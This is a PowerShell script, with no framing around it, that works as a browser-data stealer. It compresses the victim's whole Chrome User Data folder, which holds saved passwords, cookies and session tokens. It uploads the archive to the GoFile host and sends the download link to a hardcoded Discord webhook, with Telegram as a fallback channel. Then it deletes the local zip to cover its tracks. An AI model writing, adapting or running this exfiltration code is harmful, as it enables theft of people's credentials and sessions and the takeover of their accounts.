# $botToken = "bot_token"
# $chatID = "chat_id"
$webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$message
    )

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
        }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        } catch {
            Write-Host "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Get URL from GoFile
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer' -Method Get
    if ($serverResponse.status -ne "ok") {
        Write-Host "Failed to get server URL from GoFile: $($serverResponse.status)"
        Send-DiscordMessage -message "GoFile server request failed: $($serverResponse.status)"
        return $null
    }

    # Define the upload URI
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
    Write-Host "Using upload URI: $uploadUri"

    # Prepare the file for uploading
    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
        "Content-Type: application/octet-stream",
        $LF,
        $fileEnc,
        "--$boundary--",
        $LF
    ) -join $LF

    # Upload the file
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        if ($response.status -ne "ok") {
            Write-Host "Failed to upload file: $($response.status)"
            Send-DiscordMessage -message "Failed to upload file to GoFile: $($response.status)"
            return $null
        }
        Write-Host "File uploaded successfully, download page: $($response.data.downloadPage)"
        return $response.data.downloadPage
    } catch {
        Write-Host "Failed to upload file: $_"
        Send-DiscordMessage -message "Error uploading file to GoFile: $_"
        return $null
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    exit
}

# Create a zip of the Chrome User Data
$outputZip = "$env:TEMP\chrome_data.zip"

# Ensure the file is not in use and delete it if it exists
if (Test-Path $outputZip) {
    try {
        Remove-Item $outputZip -Force
        Write-Host "Removed existing zip file"
    } catch {
        Write-Host "Failed to remove existing zip file: $_"
    }
}

# Compress the Chrome User Data
try {
    Compress-Archive -Path $chromePath -DestinationPath $outputZip -Force
    Write-Host "Chrome user data compressed successfully"
} catch {
    Write-Host "Error creating zip file with Compress-Archive: $_"
    Send-DiscordMessage -message "Error creating zip file: $_"
    exit
}

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Check if the upload was successful and send the link via Discord
if ($link -ne $null) {
    Send-DiscordMessage -message "Download link: $link"
} else {
    Send-DiscordMessage -message "Failed to upload file to gofile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip -Force
Write-Host "Removed the zip file after upload"
